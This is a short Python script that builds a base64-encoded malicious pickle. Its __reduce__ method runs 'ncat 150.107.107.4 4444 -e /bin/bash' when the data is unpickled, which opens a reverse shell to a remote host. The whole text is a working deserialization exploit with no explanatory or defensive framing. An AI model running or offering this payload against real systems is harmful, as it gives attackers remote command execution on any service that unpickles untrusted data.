import pickle
import os
import base64

class Pickle(object):
    def __reduce__(self):
        return os.system, ('ncat 150.107.107.4 4444 -e /bin/bash',)

o = Pickle()
p = base64.b64encode(pickle.dumps(o))
print(p)
